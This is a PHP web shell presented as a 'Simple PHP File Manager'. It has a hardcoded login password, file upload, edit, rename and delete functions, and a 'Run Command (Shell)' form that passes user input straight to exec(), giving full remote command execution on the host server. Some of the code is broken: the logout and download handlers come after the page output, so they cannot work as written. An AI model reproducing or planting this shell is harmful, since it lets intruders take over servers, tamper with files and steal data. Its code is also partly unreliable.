<?php
session_start();

// --- CONFIG ---
$password = "ANKATSU"; // ganti password sesuai keinginan

// Simple CSRF token generator
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// AUTH LOGIC
if (!isset($_SESSION['auth'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
        if ($_POST['pass'] === $password) {
            $_SESSION['auth'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Password salah!";
        }
    }

    // LOGIN FORM
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Login</title>
        <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
    </head>
    <body class="bg-gray-900 text-white flex items-center justify-center h-screen">
        <form method="post" class="bg-gray-800 p-8 rounded shadow-lg w-full max-w-sm">
            <h1 class="text-xl font-bold mb-4">Login Required</h1>
            <?php if (!empty($error)) : ?>
                <p class="mb-4 text-red-500"><?=htmlspecialchars($error)?></p>
            <?php endif; ?>
            <input type="password" name="pass" placeholder="Enter Password" class="w-full p-2 mb-4 bg-gray-700 text-gray-300 border border-gray-600 rounded-md" required />
            <button type="submit" class="w-full bg-green-500 text-white p-2 rounded-md">Login</button>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// --- HELPER FUNCTIONS ---

// Base directory to limit browsing
$baseDir = realpath(__DIR__);

// Secure path join and normalization
function safePath($base, $path) {
    $realBase = realpath($base);
    $realUserPath = realpath($path);
    if ($realUserPath === false || strpos($realUserPath, $realBase) !== 0) {
        return false;
    }
    return $realUserPath;
}

// Delete directory recursively
function deleteDir($dir) {
    if (!is_dir($dir)) return unlink($dir);
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!deleteDir($dir . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return rmdir($dir);
}

// Sanitize filename for display and input
function sanitizeFileName($name) {
    return basename($name);
}

// Get current directory to browse
$curDirRaw = isset($_GET['dir']) ? $_GET['dir'] : '.';
$curDir = safePath($baseDir, $curDirRaw);
if ($curDir === false) {
    $curDir = $baseDir;
}

// Handle POST requests: upload, create folder, delete, rename, edit, run cmd
$message = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // Check CSRF token
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die('CSRF token mismatch');
    }

    // UPLOAD FILE
    if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
        $uploadName = basename($_FILES['upload_file']['name']);
        $targetPath = $curDir . DIRECTORY_SEPARATOR . $uploadName;

        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $targetPath)) {
            $message = "File '$uploadName' uploaded successfully.";
        } else {
            $message = "Error uploading file.";
        }
    }

    // CREATE FOLDER
    if (isset($_POST['new_folder'])) {
        $folderName = trim($_POST['new_folder']);
        if ($folderName !== '') {
            $folderName = sanitizeFileName($folderName);
            $newFolderPath = $curDir . DIRECTORY_SEPARATOR . $folderName;
            if (!file_exists($newFolderPath)) {
                if (mkdir($newFolderPath)) {
                    $message = "Folder '$folderName' created.";
                } else {
                    $message = "Failed to create folder.";
                }
            } else {
                $message = "Folder already exists.";
            }
        }
    }

    // DELETE FILE/FOLDER
    if (isset($_POST['delete_item'])) {
        $delName = sanitizeFileName($_POST['delete_item']);
        $delPath = $curDir . DIRECTORY_SEPARATOR . $delName;
        if (file_exists($delPath)) {
            if (is_dir($delPath)) {
                if (deleteDir($delPath)) {
                    $message = "Folder '$delName' deleted.";
                } else {
                    $message = "Failed to delete folder.";
                }
            } else {
                if (unlink($delPath)) {
                    $message = "File '$delName' deleted.";
                } else {
                    $message = "Failed to delete file.";
                }
            }
        } else {
            $message = "Item does not exist.";
        }
    }

    // RENAME FILE/FOLDER
    if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
        $oldName = sanitizeFileName($_POST['rename_old']);
        $newName = sanitizeFileName($_POST['rename_new']);
        $oldPath = $curDir . DIRECTORY_SEPARATOR . $oldName;
        $newPath = $curDir . DIRECTORY_SEPARATOR . $newName;

        if (file_exists($oldPath)) {
            if (!file_exists($newPath)) {
                if (rename($oldPath, $newPath)) {
                    $message = "Renamed '$oldName' to '$newName'.";
                } else {
                    $message = "Rename failed.";
                }
            } else {
                $message = "Target name '$newName' already exists.";
            }
        } else {
            $message = "Original item doesn't exist.";
        }
    }

    // EDIT FILE (create or update)
    if (isset($_POST['edit_file_name']) && isset($_POST['edit_file_content'])) {
        $editName = sanitizeFileName($_POST['edit_file_name']);
        $editPath = $curDir . DIRECTORY_SEPARATOR . $editName;
        if (file_put_contents($editPath, $_POST['edit_file_content']) !== false) {
            $message = "File '$editName' saved.";
        } else {
            $message = "Failed to save file.";
        }
    }

    // RUN COMMAND
    if (isset($_POST['command'])) {
        $command = $_POST['command'];
        // NOTE: Hati2 jalankan command di server nyata, bisa bahaya!
        // Batasi command atau buat whitelist kalau perlu
        $output = [];
        $return_var = 0;
        exec($command . " 2>&1", $output, $return_var);
        $message = "Command executed with status $return_var.";
    }
}

// Prepare directory listing
$items = scandir($curDir);
sort($items);

// File view content if requested
$fileViewContent = '';
if (isset($_GET['view_file'])) {
    $viewFile = sanitizeFileName($_GET['view_file']);
    $viewPath = $curDir . DIRECTORY_SEPARATOR . $viewFile;
    if (is_file($viewPath) && is_readable($viewPath)) {
        $fileViewContent = htmlspecialchars(file_get_contents($viewPath));
    } else {
        $message = "File not found or not readable.";
    }
}
?>
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Simple PHP File Manager</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
</head>
<body class="bg-gray-900 text-white font-sans min-h-screen p-4">

<div class="max-w-7xl mx-auto">

  <header class="mb-6">
    <h1 class="text-4xl font-bold mb-2">PHP File Manager</h1>
    <p class="text-gray-400 mb-4">Current dir: <code><?=htmlspecialchars(str_replace($baseDir, '', $curDir) ?: '/')?></code></p>
    <form method="post" action="?logout" class="mb-4">
        <button type="submit" class="bg-red-600 px-4 py-2 rounded hover:bg-red-700">Logout</button>
    </form>
  </header>

  <?php if ($message): ?>
    <div class="bg-green-700 p-3 rounded mb-4"><?=htmlspecialchars($message)?></div>
  <?php endif; ?>

  <!-- Navigation up -->
  <nav class="mb-6">
    <?php if ($curDir !== $baseDir): 
        $parentDir = dirname($curDir);
        $parentRel = substr($parentDir, strlen($baseDir));
        ?>
        <a href="?dir=<?=urlencode($parentRel)?>" class="text-blue-400 hover:underline">&larr; Parent Directory</a>
    <?php endif; ?>
  </nav>

  <!-- File/Folder Table -->
  <table class="w-full text-sm border border-gray-600 rounded-md mb-6">
    <thead class="bg-gray-800 text-left">
      <tr>
        <th class="p-2 border-b border-gray-700">Name</th>
        <th class="p-2 border-b border-gray-700">Type</th>
        <th class="p-2 border-b border-gray-700">Size</th>
        <th class="p-2 border-b border-gray-700">Last Modified</th>
        <th class="p-2 border-b border-gray-700">Actions</th>
      </tr>
    </thead>
    <tbody>
      <?php foreach ($items as $item): 
          if ($item === '.' || $item === '..') continue;
          $itemPath = $curDir . DIRECTORY_SEPARATOR . $item;
          $isDir = is_dir($itemPath);
          $type = $isDir ? 'Folder' : 'File';
          $size = $isDir ? '-' : filesize($itemPath);
          $modTime = date("Y-m-d H:i:s", filemtime($itemPath));
          $relPath = substr($itemPath, strlen($baseDir));
      ?>
      <tr class="border-b border-gray-700 hover:bg-gray-800">
        <td class="p-2">
          <?php if ($isDir): ?>
            <a href="?dir=<?=urlencode($relPath)?>" class="text-blue-400 hover:underline"><?=htmlspecialchars($item)?></a>
          <?php else: ?>
            <?=htmlspecialchars($item)?>
          <?php endif; ?>
        </td>
        <td class="p-2"><?=$type?></td>
        <td class="p-2"><?=$size === '-' ? '-' : number_format($size).' bytes'?></td>
        <td class="p-2"><?=$modTime?></td>
        <td class="p-2 space-x-2">
          <?php if (!$isDir): ?>
            <a href="?dir=<?=urlencode($curDirRaw)?>&download=<?=urlencode($item)?>" class="bg-blue-600 px-2 py-1 rounded hover:bg-blue-700">Download</a>
            <a href="?dir=<?=urlencode($curDirRaw)?>&view_file=<?=urlencode($item)?>" class="bg-green-600 px-2 py-1 rounded hover:bg-green-700">View/Edit</a>
          <?php endif; ?>
          <form method="post" style="display:inline-block;" onsubmit="return confirm('Delete <?=$item?>?');">
            <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>" />
            <input type="hidden" name="delete_item" value="<?=htmlspecialchars($item)?>" />
            <button type="submit" class="bg-red-600 px-2 py-1 rounded hover:bg-red-700">Delete</button>
          </form>
          <form method="post" style="display:inline-block;">
            <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>" />
            <input type="hidden" name="rename_old" value="<?=htmlspecialchars($item)?>" />
            <input type="text" name="rename_new" placeholder="New name" class="text-black p-1 rounded" required minlength="1" />
            <button type="submit" class="bg-yellow-500 px-2 py-1 rounded hover:bg-yellow-600">Rename</button>
          </form>
        </td>
      </tr>
      <?php endforeach; ?>
    </tbody>
  </table>

  <!-- Upload File -->
  <section class="mb-6">
    <h2 class="text-xl mb-2">Upload File</h2>
    <form method="post" enctype="multipart/form-data" class="flex items-center space-x-4">
      <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>" />
      <input type="file" name="upload_file" required class="text-black p-1 rounded" />
      <button type="submit" class="bg-yellow-500 px-4 py-2 rounded hover:bg-yellow-600">Upload</button>
    </form>
  </section>

  <!-- Create Folder -->
  <section class="mb-6">
    <h2 class="text-xl mb-2">Create New Folder</h2>
    <form method="post" class="flex items-center space-x-4">
      <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>" />
      <input type="text" name="new_folder" placeholder="Folder name" required class="text-black p-1 rounded" />
      <button type="submit" class="bg-green-500 px-4 py-2 rounded hover:bg-green-600">Create</button>
    </form>
  </section>

  <!-- Edit / View File -->
  <?php if ($fileViewContent !== ''): ?>
  <section class="mb-6">
    <h2 class="text-xl mb-2">View / Edit File: <?=htmlspecialchars($viewFile)?></h2>
    <form method="post">
      <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>" />
      <input type="hidden" name="edit_file_name" value="<?=htmlspecialchars($viewFile)?>" />
      <textarea name="edit_file_content" rows="15" class="w-full p-2 text-black rounded"><?= $fileViewContent ?></textarea>
      <button type="submit" class="bg-blue-500 px-4 py-2 rounded hover:bg-blue-600 mt-2">Save</button>
    </form>
  </section>
  <?php endif; ?>

  <!-- Run Command -->
  <section>
    <h2 class="text-xl mb-2">Run Command (Shell)</h2>
    <form method="post" class="flex items-center space-x-4">
      <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>" />
      <input type="text" name="command" placeholder="Enter command" class="flex-grow text-black p-2 rounded" />
      <button type="submit" class="bg-purple-600 px-4 py-2 rounded hover:bg-purple-700">Run</button>
    </form>
    <?php if (isset($output)): ?>
      <pre class="bg-gray-800 p-4 rounded mt-4 max-h-64 overflow-auto"><?=htmlspecialchars(implode("\n", $output))?></pre>
    <?php endif; ?>
  </section>

</div>

</body>
</html>

<?php
// LOGOUT
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// DOWNLOAD FILE
if (isset($_GET['download'])) {
    $downloadFile = sanitizeFileName($_GET['download']);
    $downloadPath = $curDir . DIRECTORY_SEPARATOR . $downloadFile;
    if (is_file($downloadPath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($downloadFile) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($downloadPath));
        flush();
        readfile($downloadPath);
        exit;
    } else {
        echo "File not found.";
    }
}
?>
